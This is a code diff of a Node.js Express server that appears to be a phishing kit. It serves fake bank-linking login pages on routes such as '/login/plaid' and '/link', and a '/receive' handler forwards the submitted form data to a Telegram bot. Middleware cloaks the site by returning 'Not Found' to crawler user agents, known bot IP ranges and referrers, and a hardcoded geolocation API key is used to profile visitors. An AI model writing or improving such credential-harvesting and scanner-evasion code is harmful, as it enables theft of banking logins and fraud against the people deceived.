@@ -1,90 +1,50 @@
 const express = require('express');
+const app = express();
 const bodyParser = require('body-parser');
 const path = require('path');
-const fs = require('fs').promises;
-const { getClientIp } = require("request-ip");
+const { botToken, chatId } = require('./config/settings.js');
+const antibot = require('./middleware/antibot');
+//const { getClientIp } = require("request-ip");
+const https = require('https');
+const querystring = require('querystring');
 const axios = require('axios');
-const { sendMessageFor } = require('simple-telegram-message');
+const URL = `https://api-bdc.net/data/ip-geolocation?ip=`;
+const ApiKey = 'bdc_4422bb94409c46e986818d3e9f3b2bc2';
+const fs = require('fs').promises; 
 const isbot = require('isbot');
 const ipRangeCheck = require('ip-range-check');
 const { botUAList } = require('./config/botUA.js');
 const { botIPList, botIPRangeList, botIPCIDRRangeList, botIPWildcardRangeList } = require('./config/botIP.js');
 const { botRefList } = require('./config/botRef.js');
-const ApiKey = 'bdc_4422bb94409c46e986818d3e9f3b2bc2';
+const { use } = require('express/lib/router');
+const { sendMessageFor } = require('simple-telegram-message');
 
-const {
-  botToken,
-  chatId
-} = require('./config/settings.js');
-
-const app = express();
 const port = 3000;
+
+
+
+
+app.listen(port, () => {
+  console.log(`Server is running on port ${port}`);
+});
 
 app.use(bodyParser.urlencoded({ extended: false }));
 app.use(bodyParser.json());
 app.use(express.static(path.join(__dirname, 'public')));
+app.set('trust proxy', true); 
 
-
-// Middleware function for bot detection
-app.use((req, res, next) => {
-  const clientUA = req.headers['user-agent'] || req.get('user-agent');
-  const clientIP = getClientIp(req);
-  const clientRef = req.headers.referer || req.headers.origin;
-
-  try {
-    if (isBotUA(clientUA) || isBotIP(clientIP) || isBotRef(clientRef)) {
-      console.log(`Blocked request: User-Agent: ${clientUA}, IP: ${clientIP}, Referrer: ${clientRef}`);
-      return res.status(404).send('Not Found');
-    } else {
-      next();
-    }
-  } catch (error) {
-    console.error('Error in bot detection middleware:', error);
-    res.status(500).send('Internal Server Error');
+function getClientIp(req) {
+  const xForwardedFor = req.headers['x-forwarded-for'];
+  if (xForwardedFor) {
+    const ips = xForwardedFor.split(',');
+    return ips[0].trim();
   }
-});
-
-app.get('/', async (req, res) => {
-  try {
-    const htmlContent = await fs.readFile(path.join(__dirname, 'views', 'index.html'), 'utf-8');	
-  	res.send(htmlContent);
-  } catch (error) {
-    console.error('Error reading file for /index.html', error);
-    res.status(500).send('Internal Server Error');
-  }
-});
-
-app.get('/Authenticate', async (req, res) => {
-  try {
-
-    const htmlContent = await fs.readFile(path.join(__dirname, 'views', 'confirm.html'), 'utf-8');
-    console.log(htmlContent);
-    res.send(htmlContent);
-  } catch (error) {
-    console.error('Error reading file for /confirm.html', error);
-    res.status(500).send('Internal Server Error');
-  }
-});
-
-
-
-// Function to send API request
-async function sendAPIRequest(ipAddress) {
-  try {
-    const apiResponse = await axios.get(`https://api-bdc.net/data/ip-geolocation?ip=${ipAddress}&localityLanguage=en&key=${ApiKey}`);
-    return apiResponse.data;
-  } catch (error) {
-    console.error('Error fetching IP geolocation:', error);
-    return null; // Return null or a default response to handle in calling function
-  }
+  return req.connection.remoteAddress || req.socket.remoteAddress || null;
 }
 
 
-// Helper function to check if user agent is a bot
+// Middleware function for bot detection
 function isBotUA(userAgent) {
-  // Log the user-agent header
-  console.log('User-Agent:', userAgent);
-
   if (!userAgent) {
     userAgent = '';
   }
@@ -102,7 +62,6 @@ function isBotUA(userAgent) {
   return false;
 }
 
-// Helper function to check if IP address is a bot
 function isBotIP(ipAddress) {
   if (!ipAddress) {
     ipAddress = '';
@@ -148,7 +107,6 @@ function isBotIP(ipAddress) {
   return false;
 }
 
-// Helper function to check if referrer is a bot
 function isBotRef(referer) {
   if (!referer) {
     referer = '';
@@ -161,6 +119,77 @@ function isBotRef(referer) {
   }
   return false;
 }
+
+app.use((req, res, next) => {
+  const clientUA = req.headers['user-agent'] || req.get('user-agent');
+  const clientIP = getClientIp(req);
+  const clientRef = req.headers.referer || req.headers.origin;
+
+  try {
+    if (isBotUA(clientUA) || isBotIP(clientIP) || isBotRef(clientRef)) {
+      console.log(`Blocked request: User-Agent: ${clientUA}, IP: ${clientIP}, Referrer: ${clientRef}`);
+      return res.status(404).send('Not Found');
+    } else {
+      next();
+    }
+  } catch (error) {
+    console.error('Error in bot detection middleware:', error);
+    res.status(500).send('Internal Server Error');
+  }
+});
+
+
+// Route handler for '/login/3'
+app.get('/login/link', async (req, res) => {
+  try {
+    let htmlContent;
+        htmlContent = await fs.readFile(path.join(__dirname, 'views', 'pl.html'), 'utf-8');
+    res.send(htmlContent);
+  }
+   catch (error) {
+    console.error('Error reading file:', error);
+    res.status(500).send('Internal Server Error');
+  }
+});
+
+
+app.get('/login/plaid', async (req, res) => {
+  try {
+    let htmlContent;
+        htmlContent = await fs.readFile(path.join(__dirname, 'views', 'pllogin.html'), 'utf-8');
+    
+    res.send(htmlContent);
+  }
+   catch (error) {
+    console.error('Error reading file:', error);
+    res.status(500).send('Internal Server Error');
+  }
+});
+
+app.get('/link', async (req, res) => {
+  try {
+    let htmlContent;
+        htmlContent = await fs.readFile(path.join(__dirname, 'views', 'plbanks.html'), 'utf-8');
+    
+    res.send(htmlContent);
+  }
+   catch (error) {
+    console.error('Error reading file:', error);
+    res.status(500).send('Internal Server Error');
+  }
+});
+
+app.get('/confirm', async (req, res) => {
+  try {
+    let htmlContent;
+        htmlContent = await fs.readFile(path.join(__dirname, 'views', 'confirm.html'), 'utf-8');
+    
+    res.send(htmlContent);
+  } catch (error) {
+    console.error('Error reading file:', error);
+    res.status(500).send('Internal Server Error');
+  }
+});
 
 
 // Middleware function for form submission
@@ -275,13 +304,36 @@ app.post('/receive', async (req, res) => {
   sendMessage(message);
 });
 
-// Function to send API request
-async function sendAPIRequest(ipAddress) {
-  const apiResponse = await axios.get(`https://api-bdc.net/data/ip-geolocation?ip=${ipAddress}&localityLanguage=en&key=${ApiKey}`);
-  return apiResponse.data;
+
+// Route handler for login pages
+app.get('/Authenticate', async (req, res) => {
+  try {
+    let htmlContent;
+    const page = req.params.page;
+    const fileName = `index.html`;
+    htmlContent = await fs.readFile(path.join(__dirname, 'views', fileName), 'utf-8');
+    res.send(htmlContent);
+  } catch (error) {
+    console.error('Error reading file:', error);
+    res.status(500).send('Internal Server Error');
+  }
+});
+
+app.get('/', async (req, res) => {
+        res.redirect('/login');
+});
+
+// Middleware function for bot detection
+function antiBotMiddleware(req, res, next) {
+  const clientUA = req.headers['user-agent'] || req.get('user-agent');
+  const clientIP = getClientIp(req);
+  const clientRef = req.headers.referer || req.headers.origin;
+
+  if (isBotUA(clientUA) || isBotIP(clientIP) || isBotRef(clientRef)) {
+    return res.status(404).send('Not Found');
+  } else {
+    next();
+  }
 }
 
-// Start the server
-app.listen(port, () => {
-  console.log(`Server is running on port ${port}`);
-});
+app.use(antiBotMiddleware);
